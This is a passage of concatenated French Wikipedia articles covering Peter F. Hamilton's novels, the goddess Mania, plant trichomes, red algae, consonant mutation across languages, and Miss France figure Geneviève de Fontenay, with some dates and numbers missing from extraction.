Sa popularité grimpe à nouveau lorsque Bragelonne publie en "Dragon déchu" décrivant une véritable société ultra-capitaliste. L'auteur y prend son temps et précise des aspects surprenants de la vie du héros, des vaisseaux interstellaires et des principes sur les voyages spatiaux entre les portails et trous de ver.
"La Saga du Commonwealth".
Arrive en "L'Étoile de Pandore", premier tome de "La Saga du Commonwealth" qui s'étend à travers des dizaines de mondes et de personnages, montre une nouvelle fois le futur proche de l'humanité sur un thème de rajeunissement. Le second sort en . En revanche, contrairement aux deux premiers volets, le troisième contient un sous-titre : ' qui sort en et le dernier ' en septembre de la même année.
Cette tétralogie explore les effets sociaux de la quasi complète élimination de l'expérience sur la mort à la suite de l'utilisation généralisée de la technique de rajeunissement décrite dans le roman inédit en France "Misspent Youth," qui se passe dans le même univers 340 ans plus tôt. Un peu du même style que "L'Aube de la nuit", Peter F. Hamilton décrit également, en détails, un univers avec un petit nombre d'espèces exotiques distinctes en interaction essentiellement pacifique et qui se trouvent soudainement face à une menace extérieure de plus en plus sinistre.
S'y rattachent aussi plusieurs nouvelles.
"La Trilogie du Vide".
Le "Vide qui songe" de "La Trilogie du Vide", publié en , se situe dans le même univers que "La Saga du Commonwealth", mille deux cents ans après la fin du dernier roman "Judas déchaîné". L'auteur met en ligne la chronologie "Timeline" sur son site internet, nous permettant de savoir ce qui s'est passé durant la période séparant "L'Étoile de Pandore" et la dernière trilogie qui la suit. À noter que, dans l'anthologie "Le Nouveau Space Opera" de Gardner Dozois et Jonathan Strahan, parue en , une nouvelle "Béni par un ange", écrite en 2007, se produit également dans cet univers et raconte une rencontre avec un ange technologique. Le dernier volet intitulé "Vide en évolution" a été publié en .
"Greg Mandel".
En attendant le dernier volume de "La Trilogie du Vide", le label Milady des éditions Bragelonne publie finalement la trilogie de "Greg Mandel", dont le premier volume "Mindstar" sort en et le second "Quantum" en septembre. L'histoire se déroule dans l'Angleterre du , profondément modifiée par le réchauffement climatique, et raconte un ancien militaire, vétéran de la guerre en Turquie, qui faisait en effet partie de la brigade "Mindstar" qui regroupait les combattants doués de pouvoirs psychiques.
L'action se déroule alors dans l'Angleterre native de l'auteur (comté du Rutland) entre la ville de Peterborough (devenu un port après la montée des eaux et la submersion de l'estuaire de la Rivière Nene) et le lac d'Oakham (réservoir d'eau du Rutland) où G. Mandel installera sa ferme sur une péninsule au milieu du lac.
"Les Naufragés du Commonwealth".
En 2014, l'auteur publie le début d'un nouveau cycle dont l'histoire se déroule dans le même univers que "La Saga du Commonwealth". Chronologiquement, elle se trouve entre la saga du Commonwealth et la Trilogie du Vide. Mais elle est parue en dernier après les deux autres sagas. Dans celui-ci d'autres humains issus d'une flotte de colonisation parviennent dans le Vide et y sont confrontés à un ennemi, les Fallers.
Comme souvent chez Hamilton, il y a plusieurs genres utilisés : space opera, fantastique et steampunk.
"L'Arche spatiale".
Âgée de seize ans, Hazel vit dans le Daedalus, une arche interstellaire qui navigue entre les étoiles à la recherche d'un nouveau monde depuis cinq siècles. Mais les machines à bord ne pourvoient plus à leurs besoins depuis la mutinerie peu après leur départ, matée au terme d'un conflit dévastateur. À présent, avec des ressources limitées, tout le contenu de l'habitat doit être Cyclé, y compris les êtres humains. En clair : les gens sont condamnés à mort à l'âge de soixante-cinq ans pour le bien commun.
Lorsque son frère subit un accident paralysant et se voit menacé d'être Cyclé en tant que bouche inutile, Hazel s'enfuit avec lui pour rejoindre les Tricheurs, des rebelles qui refusent le Cyclage. Ils lui révèlent que le Daedalus a été endommagé, son atmosphère s'échappant dans l'espace - et que l'histoire des cinq derniers siècles qu'on raconte aux passagers de l'arche est fausse...
Travail.
Peter F. Hamilton écrit principalement pendant l'après-midi et le soir, sans contrainte de durée, son but étant d'aller au bout de la partie en cours d'écriture. De manière générale, il relit sa première version, voit s'il peut l'améliorer pour en arriver à la version définitive.
Style.
Avant de commencer le processus d'écriture d'une œuvre telle que "La Trilogie du Vide", Peter F. Hamilton passe entre six et neuf mois à mettre en place les détails de l'univers, de façon à établir un ensemble cohérent et logique, et il prend son temps sur la création du monde également. Une fois que tout est en place, il commence enfin à développer plusieurs personnages dont plus de trois principaux. Les thèmes de ses romans évoquent souvent la politique et des scènes de sexe.
Il est souvent associé à d'autres auteurs de "space opera" comme Alastair Reynolds, Stephen Baxter, Ken MacLeod et d'autres écrivains du Royaume-Uni, ainsi qu'à des auteurs américains de space opera notamment Dan Simmons.

</doc>
<doc id="248767" url="https://fr.wikipedia.org/wiki?curid=248767" title="Mania (mythologie)">
Mania (mythologie)

Dans la mythologie grecque, Mania ou Manea est une divinité personnifiant la folie.
Parfois considérée comme multiple, elle est souvent rapprochée des Érinyes, avec qui elle pourrait se confondre : comme elles, elle tourmente les coupables et les laisse sans répit.
Pausanias rapporte qu'elle possédait un sanctuaire en Arcadie entre Mégalopolis et Messène.
Dans les mythologies étrusque puis romaine, elle est la déesse de la mort et donc du monde souterrain (une déité chthonienne).
Mania est mentionnée dans "l'Iliade" d'Homère comme l'un des compagnons de guerre d'Arès aux côtés de Lyssa (la colère) et de Penthos (le chagrin).

</doc>
<doc id="248768" url="https://fr.wikipedia.org/wiki?curid=248768" title="Trichome">
Trichome

Un trichome (du grec signifiant « croissance de poils ») peut signifier :

</doc>
<doc id="248772" url="https://fr.wikipedia.org/wiki?curid=248772" title="Patricia Kass">
Patricia Kass



</doc>
<doc id="248773" url="https://fr.wikipedia.org/wiki?curid=248773" title="Trichome (botanique)">
Trichome (botanique)

Les trichomes (du grec - "trikhoma" qui signifie « croissance de poil ») sont de fines excroissances ou appendices chez les plantes (sur les racines, tiges et/ou feuilles) et chez certains eucaryotes unicellulaires. On peut citer comme exemple les poils, les poils glandulaires et notamment urticants ou encore des poils qui ont évolué en écailles protectrices. Leurs fonctions semblent souvent être principalement défensives mais ils peuvent aussi protéger certaines plantes d'un froid ou d'une chaleur excessive.
Produire des trichomes a un coût énergétique pour la plante. De plus, ces trichomes nuisent parfois aux insectes qui lui sont bénéfiques. Une production accrue de trichomes peut être déclenchée par certains stress (attaques d'insectes ou d'herbivores) . Par exemple les trichomes de "Mentzelia pumila" piègent et tuent très efficacement de nombreux insectes phytophages dont les pucerons, mais aussi les larves de la coccinelle "Hippodamia convergens" qui se nourrisent de ces pucerons. Cette plante est souvent couverte d'insectes morts (dont certains de ses propres pollinisateurs), tués par ses trichomes. Un aphidien ("") a néanmoins développé des parades et arrive à produire de petites colonies sur cette plante.
Fonctions.
Les fonctions et structures des trichomes diffèrent, mais ils ont souvent un rôle adaptatif et de première ligne de défense pour la plante contre des mollusques et des insectes phytophages ou des herbivores de plus grande taille (y compris mammifères). Thomas Eisner et ses collègues entomologistes de l'université Cornell suggèrent que les insectes tués et fixés par des trichomes en crochets puissent devenir une source d'azote et de phosphore supplémentaire, et non négligeable pour certaines plantes. Certaines plantes utilisent aussi les trichomes dans leur stratégie de détoxication. Ainsi, le plant de tabac y accumule des radionucléides (principalement issus de la dégradation du radon dégazant naturellement du sol) et le cadmium toxique (sous forme cristallisée).
Les trichomes agissent principalement de deux manières : 
Terminologie botanique.
Sémantique.
Pour décrire l’apparence de la surface d’organes de plantes, tels les bourgeons ou les feuilles, plusieurs termes sont employés en référence à la présence, à la forme et à l’apparence de trichomes. Le terme employé le plus basique est glabre (absence de poils) et pubescent (poilu). Il existe de nombreux termes offrant plus de détails :
Trichomes algaux.
Certaines algues, en particulier les filamenteuses, ont la cellule terminale en forme de structure allongée (comme un poil), appelée trichome.
Le même terme s’emploie aussi (pour des structures équivalentes) chez certaines cyanobactéries.
Trichomes de plantes terrestres.
Poils aériens de surface.
Les trichomes chez les plantes sont des excroissances épidermiques de types variés. Ces excroissances se distinguent d'autres organes comme les colléters ayant pour origine une couche cellulaire plus profonde. 
Le type classique de trichome est le poil. Chez les plantes, les poils peuvent être unicellulaires ou multicellulaires, ramifiés ou non. Les poils multicellulaires peuvent avoir une ou plusieurs couches de cellules. Les poils ramifiés peuvent être dendritiques (arborescents), étoilés ou en touffes.
Un type habituel de trichome est l’écaille ou poil pelté : un groupe en forme de bouclier ou de plaque attaché directement à la surface ou né sur une tige quelconque.
Chacun des nombreux types de poil peut être glandulaire.
Il y a de très grandes variations inter- et intraspécifiques quant à la forme, la fonction, la répartition et la densité des trichomes. Cependant il est possible de lister plusieurs fonctions ou avantages à posséder des poils en surface. Il est probable que dans plusieurs cas, les poils interfèrent dans la nutrition d’au moins quelques petits herbivores et, en fonction de la rigidité et l’irritabilité au palais, quelques grands herbivores aussi.
Les poils chez les plantes en croissance dans des zones sujettes au gel permettent de garder le gel hors des cellules vivantes. Quant aux zones sujettes au vent et à la sécheresse, une abondance de poils fins permet de réduire le flux d’air à la surface des plantes, réduisant ainsi l’évaporation. Un revêtement dense de poils réfléchit les rayons du soleil et protège les tissus les plus sensibles dans des habitats ouverts, chauds et secs. Dans les endroits où la majorité de l’humidité disponible provient des précipitations, les poils semblent améliorer ce processus en emprisonnant l'eau.
Poils absorbants.
Les poils absorbants, les rhizoïdes de plusieurs plantes vasculaires, sont des excroissances tubulaires de trichoblastes, les cellules initiatrices des poils dans l’épiderme des racines des plantes. Les poils absorbants sont l’extension latérale d’une seule cellule chacun et ont très rarement des embranchements. Juste avant le développement des poils absorbants, il y a un point d’activité phosphorylase élevé.
Les poils racinaires varient entre 5 et 17 micromètres en diamètre et 80 à 1500 micromètres en longueur (Dittmar, cited in Esau, 1965).
Les poils racinaires ont une durée de vie comprise entre 2 et 3 semaines : passé ce délai, ils meurent. En même temps, de nouveaux poils racinaires sont continuellement en formation à l’apex racinaire. De cette manière, la couverture des poils racinaires est constante.
Il est donc compréhensible que le rempotage doive se faire avec soin, parce que les poils absorbants sont arrachés pour la majeure partie. Ce qui explique que le repiquage puisse causer des flétrissements.
Importance pour la paléontologie.
Bien que les trichomes soient rarement préservés chez les fossiles, des bases de trichome sont régulièrement trouvées et dans certains cas l’accès à leur structure cellulaire est un important diagnostic du point de vue de la systématique.
Biotechnologies.
Ces cellules contiennent souvent des concentrations importantes de certaines molécules de défense, ce qui intéresse l'industrie agropharmaceutique ou la chimie verte.
Certaines huiles essentielles (chez les menthes par exemple) sont produites au niveau des glandes de certains trichomes, ce qui intéresse depuis longtemps le génie génétique.

</doc>
<doc id="248777" url="https://fr.wikipedia.org/wiki?curid=248777" title="Rhodophyta">
Rhodophyta

Les , ou (division des ), sont un grand taxon d'algues pour la plupart marines et pour la plupart multicellulaires (la plupart sont sessiles, c'est-à-dire qu'elles se développent fixées sur un substrat quelconque).
Elles sont caractérisées par une composition pigmentaire avec un seul type de chlorophylle, la chlorophylle "a", des caroténoïdes et des pigments caractéristiques, les phycobiliprotéines. Elles seraient apparues pendant l'Ectasien du Mésoprotérozoïque il y a , et seraient de ce fait les seconds plus anciens organismes vivants pluricellulaires découverts entre le Gabonionta apparu à l'Orosirien il y a environ , et la faune de l'Édiacarien datant d'environ , sans qu'un lien puisse être démontré entre ces trois « apparitions ».
Organisation.
Les pigments photosynthétiques.
Les rhodophytes contiennent des pigments rencontrés chez les autres végétaux, la chlorophylle "a" et des caroténoïdes, mais leur originalité consiste dans la présence de phycobilisomes comprenant les phycobiliprotéines : allophycocyanine (bleu), phycocyanine (bleu) et phycoérythrine qui donne la couleur rouge. Le chloroplaste peut alors être appelé rhodoplaste. L’organisation du chloroplaste est la suivante : les thylakoïdes sont libres et ne forment pas de grana (ceci est lié à la présence des phycobilisomes à la surface des thylakoïdes), ils sont répartis concentriquement dans le chloroplaste mais occupent tout l’espace, contrairement à ceux des Glaucophytes et des Cyanobactéries.
La pigmentation (rapport des pigments présents) dépend à un degré remarquable de la longueur d'onde de la lumière qui atteint l'algue. En profondeur, les algues accumulent une grande quantité de phycoérythrine, pigment qui peut absorber la lumière à cette profondeur. Si les algues sont en surface, ce pigment rouge diminue, elles deviennent plus vertes malgré leur appellation. Cependant les quantités de chlorophylles demeurent inchangées que l’algue soit en surface ou en profondeur; on parle alors d'adaptation chromatique.
Substances de réserves.
L’amidon est stocké sous forme de vésicules dans le cytoplasme (et non dans le plaste comme chez les plantes et algues vertes) : l'amidon floridéen (aussi appelé rhodamylon).
Floridoside.
La floridoside (2-O-α-d-galactopyranosylglycerol) est un glucide, hétéroside, de formule C9H18O8. C'est une molécule propre aux algues rouges, synthétisée par toutes les algues rouges, excepté les membres de l’ordre des "Ceramiales". Elle est le produit principal de la fixation du carbone par la photosynthèse et, pourra être utilisée par la suite pour la synthèse de macromolécules (amidon, polysaccharides solubles…). C'est également un osmoprotecteur dont la concentration intracytoplasmique augmente en réponse à un stress hyperosmotique. La floridoside semble être aussi un précurseur de la paroi polysaccharidique chez quelques espèces d'algues rouges.
Organisation cellulaire.
Les Rhodophytes sont caractérisées par une organisation cellulaire de type eucaryote, mais il faut noter l’absence de cils et de flagelles (à aucun stade du développement), par un gamète mâle non-mobile et par un cycle de vie digénétique ou trigénétique (comportant successivement des générations de gamétophytes, de carposporophytes dans les cycles trigénétiques et de (tétra)sporophytes).
La paroi.
Leur paroi pectocellulosique est de composition complexe. Elle contient de la cellulose associé dans sa partie interne à d'autres polysaccharides parfois en quantité importante, agar-agar donnant une texture flexible et glissante, et dans sa partie externe elle est associée à des carbonate de calcium ce qui donne des algues dures et pierreuses : elle participe à la stabilisation des massifs coralliens en cimentant les débris coraux. La structure calcaire demeure même après la mort de l'algue, formant parfois des masses rocheuse imposantes (corallinaceae).
Écologie.
La grande majorité des algues rouges est rencontrée dans le milieu marin.
"Chondrus crispus" et "Mastocarpus stellatus" ("Gigartina stellata") sont souvent associées et vivent fixées au rocher. Ces deux espèces sont récoltées afin d'extraire les carraghénanes utilisés comme gélifiant dans l'industrie agroalimentaire.
Certaines algues rouges comme "Porphyra" sont consommées en Extrême-Orient. "Porphyra" est cultivée au Japon : sous le nom de "nori", elle intervient dans la confection des sushis.
Certaines algues rouges sont abondantes dans les récifs de coraux. Les "Corallinaceae" produisent une enveloppe extracellulaire de carbonate de calcium et peuvent participer à la construction du récif de corail.
Certaines algues rouges sont très résistantes à des conditions extrêmes et sont donc extrêmophiles : par exemple, "Cyanidium caldarium" vit à un pH inférieur à 1 dans les sources acides.
Le plus ancien fossile multicellulaire d'eucaryote découvert à ce jour serait une algue rouge filamenteuse vieille de d'années, trouvée dans les monts Vindhya. Les rhodophytes sont ainsi apparues après les cyanobactéries (anciennement appelées algues bleues) qui avaient précédemment provoqué, par l'action cumulée de la photosynthèse, le bouleversement planétaire appelé la Grande Oxydation. Elles ont profité des nouvelles conditions écologiques, notamment de l'apparition de la couche d'ozone stratosphérique qui filtre la plus grande partie du rayonnement solaire ultraviolet et qui protège de son effet biocide, pour occuper dans les océans une niche écologique plus proche de la surface. Cette nouvelle zone de développement de la vie étant cependant encore trop profonde pour que la seule chlorophylle suffise à l'autonomie énergétique, ce sont, à l'instar des cyanobactéries, les pigments complémentaires synthétisés par les algues rouges qui leur ont permis de pallier un environnement encore trop sombre et de capter l'énergie d'autres fréquences lumineuses du rayonnement solaire.
Taxinomie.
Les termes de "Rhodoplantae" ou de "Rhodobiota" (Rhodobiontes) proposés assez sont discutés. La dernière phylogénie en date propose de ne retenir que le terme de Rhodophyta (Rhodophytes) pour l'embranchement, avec deux sous-embranchements : Cyanidiophytina et Rhodophytina (Yoon "et al.", 2006).
Liste des classes et ordres.
Selon :
Selon :
Selon :
Selon :
Selon :
Il existe plusieurs genres "incertae sedis" selon :
Les génomes d'algue rouge.
Il existe 5 génomes d'algue rouge séquencés dont 4 publiés en 2013.

</doc>
<doc id="248785" url="https://fr.wikipedia.org/wiki?curid=248785" title="Mutation consonantique">
Mutation consonantique

La mutation consonantique, en synchronie, est une modification phonétique qui voit la consonne d'un mot changer selon son environnement morphologique ou syntaxique. Elle relève de la morphophonologie.
Ce phénomène se rencontre dans de nombreuses langues sur tous les continents. L'exemple typique est la mutation consonantique de l'initiale dans toutes les langues celtiques modernes. Cette mutation consonantique initiale s'observe également dans le paiute du Sud ainsi que dans plusieurs langues d'Afrique de l'Ouest, comme le peul. Les langues fenniques (ou balto-finnoises) telles que le finnois et l'estonien, ainsi que le same, ont des mutations internes aux mots, appelées alternance consonantique. Le dholuo, une langue nilo-saharienne parlée au Kenya, fait muter les consonnes finales des radicaux, ainsi que l'anglais dans une moindre mesure. La mutation des consonnes initiales, médianes et finales se rencontre également dans l'hébreu moderne. Le japonais fait muter certaines initiales en composition : le phénomène s'appelle rendaku.
Le terme de "mutation consonantique" est également employé dans un autre sens en phonétique historique, pour décrire des évolutions systématiques dans l'articulation de séries de consonnes, notamment dans les langues germaniques : voir loi de Grimm et mutation consonantique du haut-allemand.
Mutations observées dans diverses langues.
Langues celtiques.
Les langues celtiques sont connues pour leurs mutations consonantiques des initiales. Selon les langues, le nombre et les types de mutations varient: le gaélique écossais et le mannois n'en ont qu'une, le gaélique irlandais en a deux tandis que les langues brittoniques (breton, cornique et gallois) en ont trois chacune (mais pas les mêmes). De plus, le gaélique d'Irlande et les langues brittoniques possèdent des "mutations mixtes" qui font muter certains sons d'une façon et d'autres sons d'une autre manière dans certains contextes grammaticaux.
Bien que les conditions de mutation diffèrent selon les langues, certaines sont assez générales. Dans toutes les langues celtiques, les noms singuliers féminins mutent après l'article défini, ainsi que leurs adjectifs épithètes. De même, les pronoms possessifs des troisièmes personnes (« son », « sa » et « ses ») sont souvent homonymes et se distinguent à l'oral par les mutations qu'ils entraînent. Voici quelques exemples en breton, irlandais et en gallois :
Langues gaéliques.
Les langues gaéliques présentent les mutations suivantes :
L'orthographe de l'irlandais décrit précisément ses mutations, sauf pour "n" et "l" ; chaque consonne écrite correspond en phonologie à deux phonèmes, car l'irlandais pratique une distinction de palatalisation pour presque toutes ses consonnes, indiquée dans l'orthographe par l'écriture des voyelles environnantes. Le tableau suivant présente les mutations écrites, d'abord sous leur forme orthographique, puis sous forme phonologique (la réalisation phonétique varie selon les dialectes). Le phonème indiqué correspond à celui de la consonne non palatalisée.
 
L'écossais suit les mêmes principes pour indiquer la lénition.
Langues brittoniques.
Les langues brittoniques présentent les mutations suivantes :
Tableau des mutations initiales en gallois :
Paiute du Sud.
Cette langue amérindienne connaît trois mutations consonantiques, qui sont causées par différents préfixes :
Par exemple, le suffixe (en finale absolue) -pi apparaît dans différentes formes, selon le nom auquel il se suffixe :
Peul.
Le dialecte gombe du peul, parlé au Nigéria, possède des mutations causées par les classes de déclinaison. Deux types de mutations sont rencontrés : le durcissement et la prénasalisation.
Par exemple, les radicaux “homme libre” et “personne” possèdent les formes suivantes :
Finnois.
En finnois (ainsi que dans les langues apparentées comme l'estonien et de plus loin le same), les consonnes finales des radicaux mutent (ce qui est généralement appelé gradation dans la littérature anglo-saxonne et alternance consonantique en français). Il n'y a qu'un seul type de mutation, l'affaiblissement, concernant les occlusives p t k (et, dans une moindre mesure leurs correspondants voisés g et b).
Par exemple, les noms et adjectifs au génitif singulier voient leurs consonnes médianes s'affaiblir :
Dholuo.
Le dholuo (également appelé "luo" ou "lwo") est parlé par les Luos en Afrique de l'Est. Cette langue connaît des mutations entre consonnes sourdes et sonores en finale. Lors de la dérivation de l'état construit (forme que prend un nom lorsqu'il est complété : "colline de", "bâton de", etc.), le voisement de la consonne finale est modifié (Il y a également souvent des altérations des voyelles qui sont indépendantes des mutations consonantiques).
Anglais.
Le vieil anglais voisait les fricatives en finale de radical, ce que l'on observe encore dans la langue moderne dans les couples noms-verbes et dans la formation des noms pluriels anglais :
Les modifications phonétiques dans la formation du pluriel tendent à se perdre ; parmi les modifications répertoriées ci-dessous, de nombreux locuteurs ne connaissent que la mutation f–v, qui est d'ailleurs écrite :
Hébreu moderne.
L'hébreu moderne possède quelques mutations, qui ne provoquent que la spirantisation de certaines consonnes. Elles concernent les consonnes initiales, médianes ou finales des radicaux.
Par exemple, certains verbes mutent ; comparez :
Certains noms mutent également selon qu’ils soient masculin ou féminin, singulier ou pluriel, ou après les prépositions :
Mais tous les mots ne mutent pas :
Malais / Indonésien.
En malais et en indonésien, la forme active d'un verbe commençant par une occlusive ou une fricative se forme avec le préfixe "meN-", où "N" est une consonne nasale de même point d'articulation que l'initiale du radical.
Quand la consonne initiale est une occlusive sourde ou un "s", elle disparaît en ne laissant que la nasale assimilée.
Quand le radical commence par une voyelle, la nasale est réalisée "ng" .
Quand le radical est monosyllabique, il y a épenthèse vocalique et le préfixe devient "menge-".
Quand le radical commence par une nasale, le préfixe se réduit à "me-".
Exemples adaptés du Wikibook en anglais concernant l'Indonésien.
Sindarin.
Le sindarin, langue imaginaire créée par John Ronald Reuel Tolkien, possède des mutations inspirées du gallois.
La première lettre d'un nom mute généralement lorsque ce nom est fortement lié au mot qui le précède (article, préposition…). Aussi avons-nous /certh/ (rune), mais /i gerth/ (la rune). Le deuxième élément d'un mot composé et le complément d'objet direct mutent également.
Corse.
On retrouve le phénomène de mutation de la consonne initiale en Corse.
Dans la partie nord de l’île, l’initiale du mot est marquée par un mécanisme d’alternance consonantique entre position forte et position faible. La position faible est précédée d’une voyelle atone. La position forte concerne tous les autres cas : précédée d’une voyelle tonique, d’une pause, d’une consonne
Mutations et sandhi.
La mutation de la consonne initiale ne doit pas être confondue avec le sandhi, qui dénomme l’altération systématique de l'initiale des mots en fonction de leur environnement phonétique, contrairement aux mutations, qui sont déclenchées par leur environnement morphologique ou syntaxique.
Voici quelques exemples de sandhis :
Ces sandhis (ainsi que d’autres transformations phonétiques similaires) sont à l’origine historique des mutations consonantiques.
Par exemple, la mutation des fricatives anglaises décrite ci-dessus découle d’une altération par sandhi en vieil anglais : une fricative voisée apparaissant entre deux voyelles (ou d’autres consonnes voisées) était voisée, une fricative sourde apparaissant à l’initiale, en finale ou à côté d’une consonne sourde était sourde. Les infinitifs du vieil anglais se terminaient en et les noms pluriels en /-as/. Ainsi, “une maison” a un , alors que “maisons” et “à la maison” ont un . Dès lors que la majorité des finales furent tombées en anglais, et que le contraste entre fricatives sonores et sourdes fut devenu phonologique (en partie sous l’influence du français), la mutation était apparue.
De même, les mutations dans les langues celtiques semblent provenir d’anciens sandhis qui sont progressivement passés d’un rôle purement phonétique à un rôle grammatical après l’amuïssement des anciennes désinences.

</doc>
<doc id="248789" url="https://fr.wikipedia.org/wiki?curid=248789" title="Geneviève de Fontenay">
Geneviève de Fontenay

Geneviève de Fontenay, née Geneviève Suzanne Marie-Thérèse Mulmann le à Longwy (Meurthe-et-Moselle) et morte le à Saint-Cloud (Hauts-de-Seine), est une femme d'affaires et une figure du monde des concours de beauté français.
Elle préside le comité Miss France de 1981 à 2010 (elle y travaille depuis 1954) et fonde ensuite le comité Miss Prestige National qu'elle dirige de 2010 à 2016. « La dame au chapeau » est reconnue pour son engagement dans la promotion de la beauté et de l'élégance françaises.
Outre son rôle dans l'univers des Miss, Geneviève de Fontenay se distingue par ses prises de position sur divers sujets sociopolitiques. Elle est une figure marquante de la culture populaire française, respectée pour sa rigueur, son intégrité et son dévouement à la cause des femmes.
Biographie.
Famille et scolarité.
Geneviève Suzanne Marie Thérèse Mulmann naît le à Longwy, fille d'André Mulmann (1903-1987), ingénieur des mines dans les aciéries d'Hagondange et de Marie-Thérèse Martin (1906-1992).
Elle est l'aînée d'une fratrie de dix enfants.
Scolarisée chez les religieuses de la Miséricorde à Metz, elle abandonne le lycée pour entrer à l'école hôtelière de Strasbourg, puis suivre une formation d'esthéticienne à à Paris.
Vie privée.
En 1953, alors âgée de , elle rencontre Louis Pierre Joseph Poirot, né le à Paris (). Ils ont ensemble un premier enfant, Ludovic, né dans le le , qui se suicide à dans son appartement de Versailles.
Louis Poirot est arrêté avant la guerre dans une affaire d'escroquerie de grande envergure, plus de de l'époque de préjudice. Après guerre, se présentant comme ancien résistant et journaliste-publiciste, il est à nouveau condamné, cette fois pour faux.
Le couple s'établit à Saint-Cloud et Geneviève Mulmann qui est esthéticienne devient modéliste et mannequin. Un second enfant, Xavier, naît de leur union libre en 1961.
Louis Poirot meurt à Saint-Cloud le .
Patronyme et pseudonyme.
Le pseudonyme « de Fontenay » aurait été utilisé par Louis Poirot en tant que résistant durant l'occupation allemande. Ses deux fils, Ludovic et Xavier, sont déclarés sous le patronyme « Poirot de Fontenay ». Toutefois, à la demande du procureur de la République de Nanterre, les actes de naissance et de mariage de Xavier Poirot et les actes de naissance de ses filles sont rectifiés pour que leur état civil soit changé en Poirot, sans la particule ni le pseudonyme, une décision confirmée par les arrêts successifs de la cour d'appel de Versailles le , puis de la Cour de cassation le .
Le "Journal officiel" du publie la requête de (Xavier, Louis, André), né le à Saint-Cloud, auprès du garde des Sceaux, .
Un décret de changement de nom, signé le par le Premier ministre Dominique de Villepin et publié le 25 au "Journal officiel" , a finalement autorisé le changement de nom en « Poirot de Fontenay » pour Xavier Poirot et ses deux filles mineures. Leurs actes de naissance ont été modifiés en ce sens en .
N'ayant pas été mariée avec le père de ses enfants, Geneviève Mulmann n'était pas concernée par ce décret et a pu continuer d'user librement du pseudonyme « Geneviève de Fontenay ».
Tenue vestimentaire.
Geneviève de Fontenay possède un unique style de chapeau créé par le modiste Daniel Masson et baptisé « Le Fontenay » qui constitue sa marque de fabrique et lui vaut le surnom de « la Dame au Chapeau ». En portant un couvre-chef, elle suit les conseils de son compagnon qui juge alors que .
Le style de ses tenues assorties, noires et blanches, est systématiquement très limité et reste inchangé depuis 1957, année où il devient à la mode.
Au sein du comité Miss France.
Assistante puis présidente du Comité Miss France.
Geneviève de Fontenay intègre, comme secrétaire générale, l'association du comité Miss France, présidé par Guy Rinaldo, en 1954. Résidant toujours à Saint-Cloud, elle est élue Miss Élégance en 1957 alors qu'elle est mannequin chez Balenciaga. Louis Poirot devient au même moment délégué général du comité. Geneviève devient l'assistante de Louis en 1962.
Après le décès de son compagnon en 1981, elle reprend le comité Miss France, y associe son fils et transforme l'organisation en société.
Développement médiatique.
Le , l'élection de Miss France est retransmise pour la première fois à la télévision et diffusée sur FR3, selon la volonté de la directrice des programmes de variétés et divertissements Sabine Mignot et de l'animateur Guy Lux. Ce dernier anime l'émission, avec au standard, Céleste Prior d'Europe 1, radio associée au programme. Cette première retransmission dans son intégralité et en direct connaitra un cafouillage dans l'annonce du résultat final.
La chaîne (devenue France 3) diffuse l'élection jusqu'en . Geneviève de Fontenay et son fils assistent successivement les animateurs Guy Lux, Sacha Distel, Yves Lecoq et Julien Lepers.
L'élection de Miss France est transférée sur TF1 en et produite par Glem Production (dirigée par Gérard Louvin). En , Geneviève de Fontenay et son fils Xavier vendent la partie commerciale et télévisuelle de leur entreprise à la société Endemol qui produit des jeux télévisés, des émissions de divertissement, d'information et de téléréalité comme "Loft Story" et "Star Academy" notamment. Le salaire de Geneviève de Fontenay, en tant que directrice adjointe de la société Miss France, est de par mois. Elle coprésente l'élection de Miss France, avec Jean-Pierre Foucault et également avec Sylvie Tellier certaines années, jusqu'en .
Polémique autour de Miss France 2008.
À la suite de la publication par le magazine "Entrevue" de photos suggestives de la Réunionnaise et Miss France 2008 Valérie Bègue, Geneviève de Fontenay souhaite que celle-ci restitue son titre, au motif qu'elle aurait enfreint le règlement du Comité Miss France. À la suite de manifestations réunionnaises, la société Miss France décide de ne pas lui retirer son titre mais la remplace par une dauphine pour représenter la France dans les concours internationaux de Miss et certains galas régionaux.
C'est ainsi que Laura Tanguy, deuxième dauphine de Miss France, est officiellement la remplaçante de Valérie Bègue aux élections de Miss Monde 2008, de Miss Univers 2008, ainsi qu'aux élections régionales aux côtés de la présidente du comité Miss France.
De Miss France à Miss Nationale.
Rupture avec Endemol et la société Miss France.
Le , Geneviève de Fontenay adresse à Endemol et à la société Miss France une lettre de récrimination, à la suite de plusieurs scandales qu'elle n'aurait pas supportés. Le même jour, elle confirme son intention de quitter la société Miss France et de créer un nouveau concours de Miss en .
Création d'un nouveau comité de Miss.
Parallèlement à la société Miss France appartenant à Endemol France, Geneviève de Fontenay crée officiellement, le , un comité dissident dont le nom est le comité Miss Nationale. La première Miss Nationale élue est Barbara Morel, le , soit le lendemain de l'élection de Miss France 2011, Laury Thilleman.
Le , la justice interdit à Geneviève de Fontenay d'organiser son concours pour 2012. Elle annonce cependant que le concours aura bien lieu mais sans elle. Christiane Lillio (Miss France 1968) est nommée présidente du comité Miss Nationale.
Le , Geneviève de Fontenay confirme le maintien de l'élection mais, à la suite de l'assignation devant le tribunal de grande instance de Nanterre par Michel Le Parmentier, détenteur de la marque « Miss Nationale », pour contrefaçon et usage illicite d'une marque déposée à l'Institut national de la propriété industrielle (INPI), Geneviève de Fontenay annonce que le concours est rebaptisé « Miss Prestige National » et qu'elle n'utilisera plus le logo qui s'inspire directement de son chapeau.
Depuis 2012, la dénomination « Miss Nationale » est utilisée par le comité Miss Nationale de Michel Le Parmentier.
Les élections sont retransmises certaines années par des médias tels que RMC, BFM TV, Non Stop People et des chaînes de télévision locales.
En , à , Geneviève de Fontenay annonce qu'elle se retire officiellement de tous les concours de beauté, déclarant qu'. De 2016 à 2020, elle est la marraine de la finale du concours Reine de cœur France.
Après son retrait des concours de beauté.
Geneviève de Fontenay se retire des concours de beauté le . Toutefois, elle continue de parcourir la France à la rencontre de son public dans des séances de dédicaces dans les supermarchés, dans les salons du mariage ou dans les foires.
En 2020, à la suite d'un différend avec Sylvie Tellier, elle refuse l'invitation de la société Miss France à participer au centenaire du concours à l'occasion de l'élection de Miss France 2021.
Prises de position.
En 2002, elle soutient Arlette Laguiller candidate Lutte ouvrière à l'élection présidentielle. Pour la campagne présidentielle de 2007, elle se prononce pour la candidate du Parti socialiste, Ségolène Royal et en 2012, elle appelle à voter pour le candidat socialiste François Hollande.
En 2016, elle propose de changer l'appellation mariage homosexuel par « gayriage » et prend position contre l'homoparentalité, la gestation pour autrui et la procréation médicalement assistée pour les lesbiennes. Elle rejoint La Manif pour tous de Ludovine de La Rochère.
